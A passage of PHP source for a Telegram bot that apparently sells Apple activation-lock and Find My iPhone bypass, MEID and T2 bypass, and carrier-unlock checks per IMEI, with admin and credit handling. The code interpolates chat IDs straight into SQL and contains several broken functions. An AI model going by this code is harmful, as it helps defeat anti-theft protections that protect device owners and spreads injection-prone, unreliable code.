        ["MEID iPad All Model","Mina USB Patcher"],
        ["👈Go Back"],
       
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
               
                break;
                
            
	
            case"View All Users":
                // $ketnoi->query("UPDATE bot SET lastupdate_id='viewusers' WHERE id_chat='$userChatId'");
                $replyMsg = "List Users 👤\n"."STT|ID_CHAT|FULL_NAME|LEVEL\n";
                 $sql = $ketnoi->query("SELECT * FROM bot ");
            while($row = mysqli_fetch_assoc($sql)){
                $replyMsg .= $row['id']."|".$row['id_chat']."|".$row['full_name']."|";
                if($row['level_admin']==1) $replyMsg.= "admin\n";
                else
                $replyMsg.= "user\n";

              //  echo "username : ".$username.", name : ".$name."<br>";
              
            }
            send("sendMessage", parameters($userChatId,$replyMsg));
                $replyMsgg = "Select Service:";
                  apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ ["FMiP OFF/ON 🔎","ICloud Clean/Lost🔑🔑🔑"],
        ["ICloud Clean/Lost (S2)", "Apple Basic Info☠"],
        ["Sim-Lock Status🔐","Model Checker Free📱✅"],
        ["Server Tools⚙","Icloud Clean"],
        ["Macbook check🔥⚡💻","Unlocks🔓"],
        ["Mina Services📞💡","More Unlocks"],
        ["Generic Check🔥","Mac Address"],
        ["View All Users", "Add User"],
        ["Add Admin", "Add Credits"],
        ["Delete User/Admin", "Update! Coming soon!"],
        ["Account Info⏳👨"]
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
        
                break;
        case"Server Tools⚙":
             //$ketnoi->query("UPDATE bot SET lastupdate_id='ibypasser' WHERE id_chat='$userChatId'");
            $replyMsgg = "Select Service:";
            apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
    $keyboard =[ ["iBypasser $50","iBypasser $30"],
    ["iBypasser $10"],
    ["👈Go Back"],
    ],
    'resize_keyboard' => true,
    'keyboard' => $keyboard))); 
            break;
            case"Add User":
                //$ketnoi->query("UPDATE bot SET lastupdate_id = 'adduser' WHERE  id_chat= '$userChatId' ");
                $replyMsg = "Enter 𝗖𝗵𝗮𝘁𝗜𝗗 🔎 ";
                send("sendMessage", parameters($userChatId,$replyMsg));
                break;
            case"Add Admin":
                //$ketnoi->query("UPDATE bot SET lastupdate_id = 'addadmin' WHERE  id_chat= '$userChatId' ");
                $replyMsg = "Enter 𝗖𝗵𝗮𝘁𝗜𝗗 🔎 ";
                send("sendMessage", parameters($userChatId,$replyMsg));
                break;
            case"Delete User/Admin":
               // $ketnoi->query("UPDATE bot SET lastupdate_id = 'delete' WHERE  id_chat= '$userChatId' ");
                $replyMsg = "Enter 𝗖𝗵𝗮𝘁𝗜𝗗 🔎 ";
                
                send("sendMessage", parameters($userChatId,$replyMsg));
                break;
			case"FMiP OFF/ON 🔎":
                 //$ketnoi->query("UPDATE bot SET lastupdate_id = 'check' WHERE  id_chat= '$userChatId' "); 
                                $replyMsg = "🛒 FMiP ON/OFF🔎\n
💰 Price: 0.02 USD\n
✔️ Submit your IMEIs:";
                  break;
                
               
            default:
                $query = "SELECT * FROM admin WHERE chat_id=$userChatId";
                $admin = mysqli_fetch_assoc(mysqli_query($ketnoi,$query));
                if($admin['status'] == 'sendtoall'){
                    $query = "SELECT * FROM `bot`";
                    $users = mysqli_query($ketnoi,$query);
                    $counter = 0;
                    while($user = mysqli_fetch_assoc($users)){
                        $mesg="test ".$user['id_chat'];
                        send("sendMessage", parameters($user['id_chat'], $userMessage));
                        $counter++;
                    }
                    $mesg="Update sent to $counter user's successfully!";
                    send("sendMessage", parameters($userChatId, $mesg));
                    $query = "UPDATE `admin` SET `status` = '' WHERE `chat_id` = $userChatId";
                    $users = mysqli_query($ketnoi,$query);
                }
                break;
           
        }
    }
   
   
 
    if($user['level_admin']==1)
    {
        $userMessage = $update["message"]["text"]?$update["message"]["text"]:"Nothing";
        switch($userMessage)
        {
            case"/start":
                $replyMsg = "➡️ Welcome Mid-Admin!!👤, Select Service:";
			
               apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsg, 'reply_markup' => array(
         $keyboard =[ ["FMiP OFF/ON 🔎","ICloud Clean/Lost🔑🔑🔑"],
        ["ICloud Clean/Lost (S2)", "Apple Basic Info☠"],
        ["Sim-Lock Status🔐","Model Checker Free📱✅"],
        ["Server Tools⚙","Icloud Clean"],
        ["Macbook check🔥⚡💻","Unlocks🔓"],
        ["Mina Services📞💡","More Unlocks"],
        ["Generic Check🔥","Mac Address"],
        ["Add User", "Delete User"],
        ["Account Info⏳👨"]        ]
        ,
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard)));  
                break;
                
            case"Mac Address":
                $ketnoi->query("UPDATE bot SET lastupdate_id = 'Mac_checker' WHERE  id_chat= '$userChatId' ");     
                $replyMsgg = "Select Service:"; 
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ ["Serial for A8", "Serial for A5/A5X/A6X"],
        ["Serial for A7"],
        ["👈Go Back"],
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
                
                break;
            case"Icloud Clean":
                $replyMsgg = "Select Service:"; 
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ ["Icloud Clean All Countries", "Icloud Clean Apple Store"],
        ["👈Go Back"],
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
                
                break;
             case"Generic Check🔥":
                $replyMsgg = "Select Service:"; 
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ ["Samsung Info","Xiaomi Lock Status🔐"],
        ["👈Go Back"],
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
                
                break;
            case"More Unlocks":
                $replyMsgg = "Select Service:"; 
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ ["Activation Check ✔","All in One"],
        ["Verizon Check", "T-Mobile Check"],
        ["MDM status on/off", "Sprint Check"],
        ["Replaced Status", "Repair Status"],
        ["👈Go Back"],
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
                
                break;
          
            case"Macbook check🔥⚡💻":
                $replyMsgg = "Select Service:"; 
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ ["Macbook/iMac info,icloud","Macbook/iMac Icloud check"],
        ["Macbook CTO check"],
        ["👈Go Back"],
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
                
                break;
            case "Account Info⏳👨":
                $checkuser = $ketnoi->query("SELECT * FROM bot WHERE id_chat='$userChatId'");
                $getallinfo = mysqli_fetch_array($checkuser);
                $userbalance= $getallinfo[balance];
                $replyMsgg = "Select Service:";
                send("sendMessage", parameters($userChatId, "Admin balance is $userbalance"));
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
                $keyboardd =[["Create Update 📱✅"],                [
                ["👈Go Back" ]],
                ],
        'resize_keyboard' => true,
        'keyboard' => $keyboardd)));
        
        
                break;
        
        
                
            case"👈Go Back":
                 $ketnoi->query("UPDATE bot SET lastupdate_id='services' WHERE id_chat='$userChatId'");
                $replyMsgg = "Select Service:";
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
         $keyboard =[ ["FMiP OFF/ON 🔎","ICloud Clean/Lost🔑🔑🔑"],
        ["ICloud Clean/Lost (S2)", "Apple Basic Info☠"],
        ["Sim-Lock Status🔐","Model Checker Free📱✅"],
        ["Server Tools⚙","Icloud Clean"],
        ["Macbook check🔥⚡💻","Unlocks🔓"],
        ["Mina Services📞💡","More Unlocks"],
        ["Generic Check🔥","Mac Address"],
        ["View All Users", "Add User"],
        ["Add Admin", "Add Credits"],
        ["Delete User/Admin", "Update! Coming soon!"],
        ["Account Info⏳👨"]
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
                
                break;
            case"Unlocks🔓":
                 $ketnoi->query("UPDATE bot SET lastupdate_id='unlocks' WHERE id_chat='$userChatId'");
                $replyMsgg = "Select Service:"; 
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ 
        ["Sprint Unlock", "Docomo Japan"],
        ["Verizon Usa Prem All","AT&T Check Unlock"],
        ["Tracfone Usa/StraightT","Verizon Clean Unlock"],
        ["AT&T Premium","AT&T Active Other Unlock"],
        ["KDDi Unlock","T-Mobile Usa iPhone"],
        ["👈Go Back"],
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
                
                break;
                
              case "Add Credits":
                $ketnoi->query("UPDATE bot SET lastupdate_id='addcredit' WHERE id_chat='$userChatId'");
                send("sendMessage", parameters($userChatId, "Please enter ChatID"));
               
                break;
             case "Mina Services📞💡":
                $ketnoi->query("UPDATE bot SET lastupdate_id='mina_services' WHERE id_chat='$userChatId'");
                $replyMsgg = "Select Service:";
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ ["Mina iCL-Removal Pass ","Macbook Bypass T2 Chip"],
        ["MEID iPhone 5S", "MEID iPhone 6, 6Plus"],
        ["MEID iPhone 6S, 6SP, SE","MEID iPhone 7, 7P"],
        ["MEID iPhone 8, 8P","MEID iPhone X"],
        ["MEID iPad All Model","Mina USB Patcher"],
        ["👈Go Back"],
       
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
               
                break;
                
            
	
            case"View All Users":
                 $ketnoi->query("UPDATE bot SET lastupdate_id='viewusers' WHERE id_chat='$userChatId'");
                $replyMsg = "List Users 👤\n"."STT|ID_CHAT|FULL_NAME|LEVEL\n";
                 $sql = $ketnoi->query("SELECT * FROM bot ");
            while($row = mysqli_fetch_assoc($sql)){
                $replyMsg .= $row['id']."|".$row['id_chat']."|".$row['full_name']."|";
                if($row['level_admin']==1) $replyMsg.= "admin\n";
                else
                $replyMsg.= "user\n";

              //  echo "username : ".$username.", name : ".$name."<br>";
              
            }
            send("sendMessage", parameters($userChatId,$replyMsg));
                $replyMsgg = "Select Service:";
                  apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
        $keyboard =[ ["FMiP OFF/ON 🔎","ICloud Clean/Lost🔑🔑🔑"],
        ["ICloud Clean/Lost (S2)", "Apple Basic Info☠"],
        ["Sim-Lock Status🔐","Model Checker Free📱✅"],
        ["Server Tools⚙","Icloud Clean"],
        ["Macbook check🔥⚡💻","Unlocks🔓"],
        ["Mina Services📞💡","More Unlocks"],
        ["Generic Check🔥","Mac Address"],
        ["View All Users", "Add User"],
        ["Add Admin", "Add Credits"],
        ["Delete User/Admin", "Update! Coming soon!"],
        ["Account Info⏳👨"]
        ],
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard))); 
        
                break;
        case"Server Tools⚙":
             $ketnoi->query("UPDATE bot SET lastupdate_id='ibypasser' WHERE id_chat='$userChatId'");
            $replyMsgg = "Select Service:";
            apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
    $keyboard =[ ["iBypasser $50","iBypasser $30"],
    ["iBypasser $10"],
    ["👈Go Back"],
    ],
    'resize_keyboard' => true,
    'keyboard' => $keyboard))); 
            break;
            case"Add User":
                $ketnoi->query("UPDATE bot SET lastupdate_id = 'adduser' WHERE  id_chat= '$userChatId' ");
                $replyMsg = "Enter 𝗖𝗵𝗮𝘁𝗜𝗗 🔎 ";
                
                send("sendMessage", parameters($userChatId,$replyMsg));
                break;
                
                send("sendMessage", parameters($userChatId,$replyMsg));
                break;
            case"Delete User":
                $ketnoi->query("UPDATE bot SET lastupdate_id = 'delete' WHERE  id_chat= '$userChatId' ");
                $replyMsg = "Enter 𝗖𝗵𝗮𝘁𝗜𝗗 🔎 ";
                
                send("sendMessage", parameters($userChatId,$replyMsg));
                break;
			case"FMiP OFF/ON 🔎":
                 $ketnoi->query("UPDATE bot SET lastupdate_id = 'fmi_check' WHERE  id_chat= '$userChatId' "); 
                $replyMsg = "🛒 FMiP ON/OFF🔎\n
💰 Price: 0.02 USD\n
✔️ Submit your IMEIs:";
               
                //$ketnoi->query("UPDATE bot SET lastupdate_id = 'check' WHERE  id_chat='$userChatId' ");
                send("sendMessage", parameters($userChatId,$replyMsg));
                break;
                $replyMsgg = "Select Service:";
                apiRequestJson("sendMessage", array('chat_id' => $userChatId, "text" => $replyMsgg, 'reply_markup' => array(
          $keyboard =[ ["FMiP OFF/ON 🔎","ICloud Clean/Lost🔑🔑🔑"],
        ["ICloud Clean/Lost (S2)", "Apple Basic Info☠"],
        ["Sim-Lock Status🔐","Model Checker Free📱✅"],
        ["Server Tools⚙","Icloud Clean"],
        ["Macbook check🔥⚡💻","Unlocks🔓"],
        ["Mina Services📞💡","More Unlocks"],
        ["Generic Check🔥","Mac Address"],
        ["Add User", "Delete User"],
        ["Account Info⏳👨"]        ]
        ,
        
        'resize_keyboard' => true,
        'keyboard' => $keyboard)));  
                break;
        }
    }

    
   
}
else
{
    send("sendMessage", parameters($userChatId,"Hi, Welcome to Terminalcreeds \nYour ChatID: ".$userChatId."\nPlease contact @savatorr to Activate this Bot 🔑"));
}



function parameters($ChatId,$Msg)
{
    return array(
        "chat_id" => $ChatId,
        "text" => $Msg,
        "parseMode" => "html");
}


function webrequest($url) 
{ 
	send("sendMessage", parameters($userChatId,"Processing... ⏳"));
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch); 
    $output = str_replace("<!-- Footer -->", "", $output); 
    $output = str_replace('<footer id="footer">', "\n", $output); 
    $output = str_replace("</body>", "", $output); 
    $output = str_replace("</html>", "", $output); 
    $output = str_replace("<font face='Georgia' size='4' color='black'>", "", $output); 
    $output = str_replace("<pre>", "\n", $output); 
    $output = str_replace("</br>", "\n", $output); 
    $output = str_replace('<span style="">', "", $output); 
    $output = str_replace('<font size="2">', "", $output); 
    $output = str_replace("<br>", "", $output);
    $output = str_replace("</font>", "", $output); 
    $output = str_replace("</span>", "", $output); 
    $output = str_replace("<strong><span style='color:red;'>", "", $output);
    $output = str_replace("Model", "\nModel", $output);
    $output = str_replace("Find My iPhone: OFF", "\nFind My iPhone: OFF", $output);
    $output = str_replace("SemiTech", "iOSUnlocker", $output);
    $output = str_replace("</strong>", "", $output);
    $output = str_replace("SemiTech OPENMENU FMI OFF Server Response", "SemiTech OPENMENU FMI OFF Server Response", $output);
    $output = str_replace("FMI STATUS : OFFLINE", "FMI STATUS : OFFLINE", $output);
    $output = str_replace("empty", "⚡️ iOSUnlocker OPENMENU FMI OFF Server Response ⚡️
==============================
Device Removed: 0
FMI STATUS : OFFLINE
NAME: NO DEVICE FOUND!
MODEL: NO DEVICE FOUND!
iCloudStatus: NO DEVICE FOUND!
==============================", $output);
    $output = str_replace("401", "⚡️ iOSUnlocker OPENMENU FMI OFF Server Response ⚡️
==============================
Device Removed: 0
Reason: Token Expired!
==============================
Solution:
1. Turn OFF and Turn ON Calendar
2. or Reload Storage and Turn OFF and Turn ON Calendar
==============================", $output);
    $output = str_replace("<strong><span style='color:green;'>", "", $output);
    $output = str_replace("Meid Type", "\nMeid Type", $output);
    $output = str_replace('<span style="background-color: #D73434; color: #fff; display: inline-block; padding: 0.1px 7px; font-weight: bold; border-radius: 10px;">', "", $output);
    if (strpos($output, "Oops, looks like the page is lost"))
    {
                send("sendMessage", parameters($userChatId,"Token Expired or Device not Found in iOSUnlocker DataBase"));
    }
    else
       send("sendMessage", parameters($userChatId,$output));
} 

function webrequests($url ="") 
{ 
    $sn = substr(__MESSAGE, 7);
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    if ($method == 'POST') {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
   $output = curl_exec($ch);
   $output = str_replace('<font face="Georgia" size="4" color="black">', '\n', $output);
   $output = str_replace("</br>", "\n", $output);
   $output = str_replace("<br>", "\n", $output);
   $output = str_replace("</br>", "\n", $output);
   $output = str_replace("<br/>", "\n", $output);
   $output = str_replace("<font size=\"4\" face=\"Georgia\" color=\"black\">", "<font size=\"4\" face=\"Georgia\" color=\"black\"", $output);
   $output = str_replace("\n", "", strip_tags($output));
   $output = str_replace("Model:","\nModel:", $output);
   $output = str_replace("DateTime:","\nDateTime:", $output);
   $output = str_replace("Clean","Clean✅", $output);
   $output = str_replace("Manufacturer: Apple", "\nManufacturer: Apple", strip_tags($output));
   $output = str_replace("Find My iPhone:", "\nFind My iPhone:", $output);
   $output = str_replace("Sim-Lock:", "\nSim-Lock:", $output);
   $output = str_replace("GSMA Status:", "\nGSMA Status:", $output);
   $output = str_replace("Lost","Lost❌", $output);
   $output = str_replace("ON", "ON❌", $output);
   $output = str_replace("OFF", "OFF✅", $output);
   $output = str_replace("iCloud Status:", "\niCloud Status:", $output);
   $output = str_replace("ЁЯХТ:", "\nDate Time:", $output);
   sendMessage(__BOT_TOKEN, __CHAT_ID, urlencode($output)); 
}

function send($method, $data){
    global $BOT_TOKEN;
    $url = "https://api.telegram.org/bot$BOT_TOKEN/$method";

    if(!$curld = curl_init()){
        exit;
    }
    curl_setopt($curld, CURLOPT_POST, true);
    curl_setopt($curld, CURLOPT_POSTFIELDS, $data);
    curl_setopt($curld, CURLOPT_URL, $url);
    curl_setopt($curld, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($curld);
    curl_close($curld);
    return $output;
}
?>